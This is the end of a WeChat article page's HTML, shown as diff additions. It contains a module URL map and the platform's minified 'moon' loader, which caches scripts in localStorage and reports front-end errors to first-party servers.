mbizwap/zh_CN/htmledition/js/appmsg/comment_utils42f400.js","biz_common/ui/imgonepx.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/ui/imgonepx42f400.js","appmsg/malicious_wording.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/malicious_wording42f400.js","biz_common/utils/wxgspeedsdk.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/wxgspeedsdk42f400.js","a/a.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/a4382e5.js","rt/appmsg/getappmsgext.rt.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/rt/appmsg/getappmsgext.rt42f400.js","pages/video_communicate_adaptor.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/video_communicate_adaptor433882.js","biz_wap/utils/ajax_wx.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/ajax_wx42f400.js","biz_common/utils/respTypes.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/respTypes42f400.js","biz_wap/utils/log.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/log42f400.js","sougou/index.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/sougou/index42f400.js","biz_wap/safe/mutation_observer_report.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/safe/mutation_observer_report42f400.js","appmsg/fereport.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/fereport438bee.js","appmsg/fereport_without_localstorage.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/fereport_without_localstorage438bee.js","appmsg/report.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/report42f400.js","appmsg/report_and_source.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/report_and_source4380a9.js","appmsg/page_pos.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/page_pos431b87.js","appmsg/cdn_speed_report.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/cdn_speed_report42f400.js","appmsg/wxtopic.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/wxtopic42f400.js","appmsg/weapp.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/weapp433882.js","appmsg/weproduct.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/weproduct42f400.js","appmsg/voicemsg.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/voicemsg42f400.js","appmsg/autoread.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/autoread42f400.js","appmsg/voice.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/voice42f400.js","appmsg/qqmusic.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/qqmusic43440b.js","appmsg/iframe.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/iframe433882.js","appmsg/product.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/product42f400.js","appmsg/review_image.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/review_image435a90.js","appmsg/outer_link.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/outer_link433882.js","appmsg/copyright_report.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/copyright_report42f400.js","appmsg/async.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/async438bee.js","biz_wap/ui/lazyload_img.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/ui/lazyload_img42f400.js","biz_common/log/jserr.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/log/jserr42f400.js","appmsg/share.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/share42f50a.js","appmsg/cdn_img_lib.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/cdn_img_lib42f400.js","appmsg/finance_communicate.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/finance_communicate42f400.js","page/appmsg_new/not_in_mm.css":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/style/page/appmsg_new/not_in_mm.css435ee6.js","page/appmsg_new/combo.css":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/style/page/appmsg_new/combo.css438c19.js","biz_wap/utils/wapsdk.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/wapsdk42f400.js","a/mpAdAsync.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/mpAdAsync4317dc.js","biz_common/utils/url/parse.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/url/parse42f400.js","appmsg/appmsg_report.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/appmsg_report435ac2.js","biz_common/moment.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/moment42f400.js","biz_wap/jsapi/core.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/jsapi/core42f400.js","biz_common/dom/event.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/dom/event42f400.js","appmsg/test.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/test42f400.js","biz_wap/utils/mmversion.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/mmversion42f400.js","appmsg/max_age.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/max_age42f400.js","biz_common/dom/attr.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/dom/attr42f400.js","biz_wap/utils/ajax.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/ajax42f400.js","appmsg/log.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/log42f400.js","biz_common/dom/class.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/dom/class42f400.js","biz_wap/utils/device.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/device42f400.js","appmsg/weapp_common.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/weapp_common42f400.js","biz_common/utils/string/html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/string/html42f400.js","cps/tpl/list_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/cps/tpl/list_tpl.html42f400.js","cps/tpl/card_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/cps/tpl/card_tpl.html42f400.js","cps/tpl/banner_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/cps/tpl/banner_tpl.html42f400.js","biz_common/tmpl.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/tmpl42f400.js","appmsg/index.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/index438e37.js"};</script><script nonce="2043559309" type="text/javascript" id="moon_inline" > window.__mooninline=1; window.setTimeout(function() {  function __moonf__(){
+if(!window.__moonhasinit){
+window.__moonhasinit=!0,window.__moonclientlog=[],window.__wxgspeeds&&(window.__wxgspeeds.moonloadedtime=+new Date),
+"object"!=typeof JSON&&(window.JSON={
+stringify:function(){
+return"";
+},
+parse:function(){
+return{};
+}
+});
+var e=function(){
+function e(e){
+try{
+var o;
+/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)?o="writeLog":/(Android)/i.test(navigator.userAgent)&&(o="log"),
+o&&t(o,e);
+}catch(n){
+throw console.error(n),n;
+}
+}
+function t(e,o){
+var n,r,i={};
+n=top!=window?top.window:window;
+try{
+r=n.WeixinJSBridge,i=n.document;
+}catch(a){}
+e&&r&&r.invoke?r.invoke(e,{
+level:"info",
+msg:"[WechatFe][moon]"+o
+}):setTimeout(function(){
+i.addEventListener?i.addEventListener("WeixinJSBridgeReady",function(){
+t(e,o);
+},!1):i.attachEvent&&(i.attachEvent("WeixinJSBridgeReady",function(){
+t(e,o);
+}),i.attachEvent("onWeixinJSBridgeReady",function(){
+t(e,o);
+}));
+},0);
+}
+var n;
+localStorage&&JSON.parse(localStorage.getItem("__WXLS__moonarg"))&&"fromls"==JSON.parse(localStorage.getItem("__WXLS__moonarg")).method&&(n=!0),
+e(" moon init, moon_inline:"+window.__mooninline+", moonls:"+n),function(){
+var e={},o={},t={};
+e.COMBO_UNLOAD=0,e.COMBO_LOADING=1,e.COMBO_LOADED=2;
+var n=function(e,t,n){
+if(!o[e]){
+o[e]=n;
+for(var r=3;r--;)try{
+moon.setItem(moon.prefix+e,n.toString()),moon.setItem(moon.prefix+e+"_ver",moon_map[e]);
+break;
+}catch(i){
+moon.clear();
+}
+}
+},r=window.alert;
+window.__alertList=[],window.alert=function(e){
+r(e),window.__alertList.push(e);
+};
+var i=function(e){
+if(!e||!o[e])return null;
+var n=o[e];
+if("function"==typeof n&&!t[e]){
+var a={},s={
+exports:a
+},c=n(i,a,s,r);
+n=o[e]=c||s.exports,t[e]=!0;
+}
+if(".css"===e.substr(-4)){
+var d=document.getElementById(e);
+if(!d){
+d=document.createElement("style"),d.id=e;
+var _=/url\s*\(\s*\/(\"(?:[^\\\"\r\n\f]|\\[\s\S])*\"|'(?:[^\\'\n\r\f]|\\[\s\S])*'|[^)}]+)\s*\)/g,m=window.testenv_reshost||window.__moon_host||"res.wx.qq.com";
+n=n.replace(_,"url(//"+m+"/$1)"),d.innerHTML=n,document.getElementsByTagName("head")[0].appendChild(d);
+}
+}
+return n;
+};
+e.combo_status=e.COMBO_UNLOAD,e.run=function(){
+var o=e.run.info,t=o&&o[0],n=o&&o[1];
+if(t&&e.combo_status==e.COMBO_LOADED){
+var r=i(t);
+n&&n(r);
+}
+},e.use=function(o,t){
+window.__wxgspeeds&&(window.__wxgspeeds.seajs_use_time=+new Date),e.run.info=[o,t],
+e.run();
+},window.define=n,window.seajs=e;
+}(),function(){
+if(window.__nonce_str){
+var e=document.createElement;
+document.createElement=function(o){
+var t=e.apply(this,arguments);
+return"object"==typeof o&&(o=o.toString()),"string"==typeof o&&"script"==o.toLowerCase()&&t.setAttribute("nonce",window.__nonce_str),
+t;
+};
+}
+window.addEventListener&&window.__DEBUGINFO&&Math.random()<.01&&window.addEventListener("load",function(){
+var e=document.createElement("script");
+e.src=__DEBUGINFO.safe_js,e.type="text/javascript",e.async=!0;
+var o=document.head||document.getElementsByTagName("head")[0];
+o.appendChild(e);
+});
+}(),function(){
+function t(e){
+return"[object Array]"===Object.prototype.toString.call(e);
+}
+function n(e){
+return"[object Object]"===Object.prototype.toString.call(e);
+}
+function r(e){
+var t=e.stack+" "+e.toString()||"";
+try{
+if(window.testenv_reshost){
+var n="http(s)?://"+window.testenv_reshost,r=new RegExp(n,"g");
+t=t.replace(r,"");
+}else t=t.replace(/http(s)?:\/\/res\.wx\.qq\.com/g,"");
+for(var r=/\/([^.]+)\/js\/(\S+?)\.js(\,|:)?/g;r.test(t);)t=t.replace(r,function(e,o,t,n){
+return t+n;
+});
+}catch(e){
+t=e.stack?e.stack:"";
+}
+var i=[];
+for(o in u)u.hasOwnProperty(o)&&i.push(o+":"+u[o]);
+return i.push("STK:"+t.replace(/\n/g,"")),i.join("|");
+}
+function i(e){
+if(!e){
+var o=window.onerror;
+window.onerror=function(){},f=setTimeout(function(){
+window.onerror=o,f=null;
+},50);
+}
+}
+function a(e,o,t){
+if(!/^mp\.weixin\.qq\.com$/.test(location.hostname)){
+var n=[];
+t=t.replace(location.href,(location.origin||"")+(location.pathname||"")).replace("#wechat_redirect","").replace("#rd","").split("&");
+for(var r=0,i=t.length;i>r;r++){
+var a=t[r].split("=");
+a[0]&&a[1]&&n.push(a[0]+"="+encodeURIComponent(a[1]));
+}
+var s=new window.Image;
+return void(s.src=(o+n.join("&")).substr(0,1024));
+}
+var c;
+if(window.ActiveXObject)try{
+c=new ActiveXObject("Msxml2.XMLHTTP");
+}catch(d){
+try{
+c=new ActiveXObject("Microsoft.XMLHTTP");
+}catch(_){
+c=!1;
+}
+}else window.XMLHttpRequest&&(c=new XMLHttpRequest);
+c&&(c.open(e,o,!0),c.setRequestHeader("cache-control","no-cache"),c.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"),
+c.setRequestHeader("X-Requested-With","XMLHttpRequest"),c.send(t));
+}
+function s(e){
+return function(o,t){
+if("string"==typeof o)try{
+o=new Function(o);
+}catch(n){
+throw n;
+}
+var r=[].slice.call(arguments,2),a=o;
+return o=function(){
+try{
+return a.apply(this,r.length&&r||arguments);
+}catch(e){
+throw e.stack&&console&&console.error&&console.error("[TryCatch]"+e.stack),_&&window.__moon_report&&(window.__moon_report([{
+offset:j,
+log:"timeout_error;host:"+location.host,
+e:e
+}]),i(f)),e;
+}
+},e(o,t);
+};
+}
+function c(e){
+return function(o,t,n){
+if("undefined"==typeof n)var n=!1;
+var r=this,a=t||function(){};
+return t=function(){
+try{
+return a.apply(r,arguments);
+}catch(e){
+throw e.stack&&console&&console.error&&console.error("[TryCatch]"+e.stack),_&&window.__moon_report&&(window.__moon_report([{
+offset:x,
+log:"listener_error;type:"+o+";host:"+location.host,
+e:e
+}]),i(f)),e;
+}
+},a.moon_lid=E,b[E]=t,E++,e.call(r,o,t,n);
+};
+}
+function d(e){
+return function(o,t,n){
+if("undefined"==typeof n)var n=!1;
+var r=this;
+return t=b[t.moon_lid],e.call(r,o,t,n);
+};
+}
+var _,m,l,w,u,p,f,h=/MicroMessenger/i.test(navigator.userAgent),g=/MPAPP/i.test(navigator.userAgent),v=window.define,y=0,x=2,O=4,j=9,D=10;
+if(window.__initCatch=function(e){
+_=e.idkey,m=e.startKey||0,l=e.limit,w=e.badjsId,u=e.reportOpt||"",p=e.extInfo||{},
+p.rate=p.rate||.5;
+},window.__moon_report=function(e,o){
+var i=!1,s="";
+try{
+s=top.location.href;
+}catch(c){
+i=!0;
+}
+var d=.5;
+if(p&&p.rate&&(d=p.rate),o&&"number"==typeof o&&(d=o),!(!/mp\.weixin\.qq\.com/.test(location.href)&&!/payapp\.weixin\.qq\.com/.test(location.href)||Math.random()>d||!h&&!g||top!=window&&!i&&!/mp\.weixin\.qq\.com/.test(s))&&(n(e)&&(e=[e]),
+t(e)&&""!=_)){
+var u="",f=[],v=[],y=[],x=[];
+"number"!=typeof l&&(l=1/0);
+for(var j=0;j<e.length;j++){
+var D=e[j]||{};
+if(!(D.offset>l||"number"!=typeof D.offset||D.offset==O&&p&&p.network_rate&&Math.random()>=p.network_rate)){
+var b=1/0==l?m:m+D.offset;
+f[j]="[moon]"+_+"_"+b+";"+D.log+";"+r(D.e||{})||"",v[j]=b,y[j]=1;
+}
+}
+for(var E=0;E<v.length;E++)x[E]=_+"_"+v[E]+"_"+y[E],u=u+"&log"+E+"="+f[E];
+if(x.length>0){
+a("POST",location.protocol+"//mp.weixin.qq.com/mp/jsmonitor?","idkey="+x.join(";")+"&r="+Math.random()+"&lc="+f.length+u);
+var d=1;
+if(p&&p.badjs_rate&&(d=p.badjs_rate),w&&Math.random()<d){
+u=u.replace(/uin\:(.)*\|biz\:(.)*\|mid\:(.)*\|idx\:(.)*\|sn\:(.)*\|/,"");
+var S=new Image,I="https://badjs.weixinbridge.com/badjs?id="+w+"&level=4&from="+encodeURIComponent(location.host)+"&msg="+encodeURIComponent(u);
+S.src=I.slice(0,1024);
+}
+}
+}
+},window.setTimeout=s(window.setTimeout),window.setInterval=s(window.setInterval),
+Math.random()<.01&&window.Document&&window.HTMLElement){
+var b={},E=0;
+Document.prototype.addEventListener=c(Document.prototype.addEventListener),Document.prototype.removeEventListener=d(Document.prototype.removeEventListener),
+HTMLElement.prototype.addEventListener=c(HTMLElement.prototype.addEventListener),
+HTMLElement.prototype.removeEventListener=d(HTMLElement.prototype.removeEventListener);
+}
+var S=window.navigator.userAgent;
+if((/ip(hone|ad|od)/i.test(S)||/android/i.test(S))&&!/windows phone/i.test(S)&&window.localStorage&&window.localStorage.setItem){
+var I=window.localStorage.setItem,L=0;
+window.localStorage.setItem=function(e,o){
+if(!(L>=10))try{
+I.call(window.localStorage,e,o);
+}catch(t){
+t.stack&&console&&console.error&&console.error("[TryCatch]"+t.stack),window.__moon_report([{
+offset:D,
+log:"localstorage_error;"+t.toString(),
+e:t
+}]),L++,L>=3&&window.moon&&window.moon.clear&&moon.clear();
+}
+};
+}
+window.seajs&&v&&(window.define=function(){
+for(var o,t=[],n=arguments&&arguments[0],a=0,s=arguments.length;s>a;a++){
+var c=o=arguments[a];
+"function"==typeof o&&(o=function(){
+try{
+return c.apply(this,arguments);
+}catch(o){
+throw"string"==typeof n&&console.error("[TryCatch][DefineeErr]id:"+n),o.stack&&console&&console.error&&console.error("[TryCatch]"+o.stack),
+_&&window.__moon_report&&(window.__moon_report([{
+offset:y,
+log:"define_error;id:"+n+";",
+e:o
+}]),i(f)),e(" [define_error]"+JSON.stringify(r(o))),o;
+}
+},o.toString=function(e){
+return function(){
+return e.toString();
+};
+}(arguments[a])),t.push(o);
+}
+return v.apply(this,t);
+});
+}(),function(o){
+function t(e,o,t){
+return window.__DEBUGINFO?(window.__DEBUGINFO.res_list||(window.__DEBUGINFO.res_list=[]),
+window.__DEBUGINFO.res_list[e]?(window.__DEBUGINFO.res_list[e][o]=t,!0):!1):!1;
+}
+function n(e){
+var o=new TextEncoder("utf-8").encode(e),t=crypto.subtle||crypto.webkitSubtle;
+return t.digest("SHA-256",o).then(function(e){
+return r(e);
+});
+}
+function r(e){
+for(var o=[],t=new DataView(e),n=0;n<t.byteLength;n+=4){
+var r=t.getUint32(n),i=r.toString(16),a="00000000",s=(a+i).slice(-a.length);
+o.push(s);
+}
+return o.join("");
+}
+function i(e,o,t){
+if("object"==typeof e){
+var n=Object.prototype.toString.call(e).replace(/^\[object (.+)\]$/,function(e,o){
+return o;
+});
+if(t=t||e,"Array"==n){
+for(var r=0,i=e.length;i>r;++r)if(o.call(t,e[r],r,e)===!1)return;
+}else{
+if("Object"!==n&&a!=e)throw"unsupport type";
+if(a==e){
+for(var r=e.length-1;r>=0;r--){
+var s=a.key(r),c=a.getItem(s);
+if(o.call(t,c,s,e)===!1)return;
+}
+return;
+}
+for(var r in e)if(e.hasOwnProperty(r)&&o.call(t,e[r],r,e)===!1)return;
+}
+}
+}
+var a=o.localStorage,s=document.head||document.getElementsByTagName("head")[0],c=1,d=11,_=12,m=13,l=window.__allowLoadResFromMp?1:2,w=window.__allowLoadResFromMp?1:0,u=l+w,p=window.testenv_reshost||window.__moon_host||"res.wx.qq.com",f=new RegExp("^(http(s)?:)?//"+p);
+window.__loadAllResFromMp&&(p="mp.weixin.qq.com",l=0,u=l+w);
+var h={
+prefix:"__MOON__",
+loaded:[],
+unload:[],
+clearSample:!0,
+hit_num:0,
+mod_num:0,
+version:1003,
+cacheData:{
+js_mod_num:0,
+js_hit_num:0,
+js_not_hit_num:0,
+js_expired_num:0,
+css_mod_num:0,
+css_hit_num:0,
+css_not_hit_num:0,
+css_expired_num:0
+},
+init:function(){
+h.loaded=[],h.unload=[];
+var e,t,r;
+if(window.no_moon_ls&&(h.clearSample=!0),a){
+var s="_moon_ver_key_",c=a.getItem(s);
+c!=h.version&&(h.clear(),a.setItem(s,h.version));
+}
+if((-1!=location.search.indexOf("no_moon1=1")||-1!=location.search.indexOf("no_lshttps=1"))&&h.clear(),
+a){
+var d=1*a.getItem(h.prefix+"clean_time"),_=+new Date;
+if(_-d>=1296e6){
+h.clear();
+try{
+!!a&&a.setItem(h.prefix+"clean_time",+new Date);
+}catch(m){}
+}
+}
+i(moon_map,function(i,s){
+if(t=h.prefix+s,r=!!i&&i.replace(f,""),e=!!a&&a.getItem(t),version=!!a&&(a.getItem(t+"_ver")||"").replace(f,""),
+h.mod_num++,r&&-1!=r.indexOf(".css")?h.cacheData.css_mod_num++:r&&-1!=r.indexOf(".js")&&h.cacheData.js_mod_num++,
+h.clearSample||!e||r!=version)h.unload.push(r.replace(f,"")),r&&-1!=r.indexOf(".css")?e?r!=version&&h.cacheData.css_expired_num++:h.cacheData.css_not_hit_num++:r&&-1!=r.indexOf(".js")&&(e?r!=version&&h.cacheData.js_expired_num++:h.cacheData.js_not_hit_num++);else{
+if("https:"==location.protocol&&window.moon_hash_map&&window.moon_hash_map[s]&&window.crypto)try{
+n(e).then(function(e){
+window.moon_hash_map[s]!=e&&console.log(s);
+});
+}catch(c){}
+try{
+var d="//# sourceURL="+s+"\n//@ sourceURL="+s;
+o.eval.call(o,'define("'+s+'",[],'+e+")"+d),h.hit_num++,r&&-1!=r.indexOf(".css")?h.cacheData.css_hit_num++:r&&-1!=r.indexOf(".js")&&h.cacheData.js_hit_num++;
+}catch(c){
+h.unload.push(r.replace(f,""));
+}
+}
+}),h.load(h.genUrl());
+},
+genUrl:function(){
+var e=h.unload;
+if(!e||e.length<=0)return[];
+var o,t,n="",r=[],i={},a=-1!=location.search.indexOf("no_moon2=1"),s="//"+p;
+-1!=location.href.indexOf("moon_debug2=1")&&(s="//mp.weixin.qq.com");
+for(var c=0,d=e.length;d>c;++c){
+/^\/(.*?)\//.test(e[c]);
+var _=/^\/(.*?)\//.exec(e[c]);
+_.length<2||!_[1]||(t=_[1],n=i[t],n?(o=n+","+e[c],o.length>1e3||a?(r.push(n+"?v="+h.version),
+n=location.protocol+s+e[c],i[t]=n):(n=o,i[t]=n)):(n=location.protocol+s+e[c],i[t]=n));
+}
+for(var m in i)i.hasOwnProperty(m)&&r.push(i[m]);
+return r;
+},
+load:function(e){
+if(window.__wxgspeeds&&(window.__wxgspeeds.mod_num=h.mod_num,window.__wxgspeeds.hit_num=h.hit_num),
+!e||e.length<=0)return seajs.combo_status=seajs.COMBO_LOADED,seajs.run(),console.debug&&console.debug("[moon] load js complete, all in cache, cost time : 0ms, total count : "+h.mod_num+", hit num: "+h.hit_num),
+void window.__moonclientlog.push("[moon] load js complete, all in cache, cost time : 0ms, total count : "+h.mod_num+", hit num: "+h.hit_num);
+seajs.combo_status=seajs.COMBO_LOADING;
+var o=0,t=+new Date;
+window.__wxgspeeds&&(window.__wxgspeeds.combo_times=[],window.__wxgspeeds.combo_times.push(t)),
+i(e,function(n){
+h.request(n,u,function(){
+if(window.__wxgspeeds&&window.__wxgspeeds.combo_times.push(+new Date),o++,o==e.length){
+var n=+new Date-t;
+window.__wxgspeeds&&(window.__wxgspeeds.mod_downloadtime=n),seajs.combo_status=seajs.COMBO_LOADED,
+seajs.run(),console.debug&&console.debug("[moon] load js complete, url num : "+e.length+", total mod count : "+h.mod_num+", hit num: "+h.hit_num+", use time : "+n+"ms"),
+window.__moonclientlog.push("[moon] load js complete, url num : "+e.length+", total mod count : "+h.mod_num+", hit num: "+h.hit_num+", use time : "+n+"ms");
+}
+});
+});
+},
+request:function(o,n,r){
+if(o){
+n=n||0,o.indexOf("mp.weixin.qq.com")>-1&&((new Image).src=location.protocol+"//mp.weixin.qq.com/mp/jsmonitor?idkey=27613_32_1&r="+Math.random(),
+window.__moon_report([{
+offset:_,
+log:"load_script_from_mp: "+o
+}],1));
+var i=-1;
+window.__DEBUGINFO&&(__DEBUGINFO.res_list||(__DEBUGINFO.res_list=[]),__DEBUGINFO.res_list.push({
+type:"js",
+status:"pendding",
+start:+new Date,
+end:0,
+url:o
+}),i=__DEBUGINFO.res_list.length-1),-1!=location.search.indexOf("no_lshttps=1")&&(o=o.replace("http://","https://"));
+var a=document.createElement("script");
+a.src=o,a.type="text/javascript",a.async=!0,a.down_time=+new Date,a.onerror=function(s){
+t(i,"status","error"),t(i,"end",+new Date);
+var _=new Error(s);
+if(n>=0)if(w>n){
+var l=o.replace("res.wx.qq.com","mp.weixin.qq.com");
+h.request(l,n,r);
+}else h.request(o,n,r);else window.__moon_report&&window.__moon_report([{
+offset:c,
+log:"load_script_error: "+o,
+e:_
+}],1);
+if(n==w-1&&window.__moon_report([{
+offset:d,
+log:"load_script_error: "+o,
+e:_
+}],1),-1==n){
+var u="ua: "+window.navigator.userAgent+", time="+(+new Date-a.down_time)+", load_script_error -1 : "+o;
+window.__moon_report([{
+offset:m,
+log:u
+}],1);
+}
+window.__moonclientlog.push("moon load js error : "+o+", error -> "+_.toString()),
+e("moon_request_error url:"+o);
+},"undefined"!=typeof moon_crossorigin&&moon_crossorigin&&a.setAttribute("crossorigin",!0),
+a.onload=a.onreadystatechange=function(){
+t(i,"status","loaded"),t(i,"end",+new Date),!a||a.readyState&&!/loaded|complete/.test(a.readyState)||(t(i,"status","200"),
+a.onload=a.onreadystatechange=null,"function"==typeof r&&r());
+},n--,s.appendChild(a),e("moon_request url:"+o+" retry:"+n);
+}
+},
+setItem:function(e,o){
+!!a&&a.setItem(e,o);
+},
+clear:function(){
+a&&(i(a,function(e,o){
+~o.indexOf(h.prefix)&&a.removeItem(o);
+}),console.debug&&console.debug("[moon] clear"));
+},
+idkeyReport:function(e,o,t){
+t=t||1;
+var n=e+"_"+o+"_"+t;
+(new Image).src="/mp/jsmonitor?idkey="+n+"&r="+Math.random();
+}
+};
+seajs&&seajs.use&&"string"==typeof window.__moon_mainjs&&seajs.use(window.__moon_mainjs),
+window.moon=h;
+}(window),function(){
+try{
+Math.random()<1;
+}catch(e){}
+}(),window.moon.init();
+};
+e(),!!window.__moon_initcallback&&window.__moon_initcallback(),window.__wxgspeeds&&(window.__wxgspeeds.moonendtime=+new Date);
+}
+}
+__moonf__(); }, 25);</script><script nonce="2043559309" type="text/javascript">
+    var real_show_page_time = +new Date();
+    if (!!window.addEventListener){
+        window.addEventListener("load", function(){
+            window.onload_endtime = +new Date();
+        });
+    }
+
+    
+    if(typeof seajs != 'undefined' && seajs.config){
+        try{
+            seajs.config({
+              'map': [
+                [ '.js', '.js?v=' + (+new Date())]
+              ]
+            });
+        }catch(e){
+            console.info('not support seajs config');
+        }
+    }
+
+    
+</script>
+
+    </body>
+    <script nonce="2043559309" type="text/javascript">document.addEventListener("touchstart", function() {},false);</script>
+</html>
+
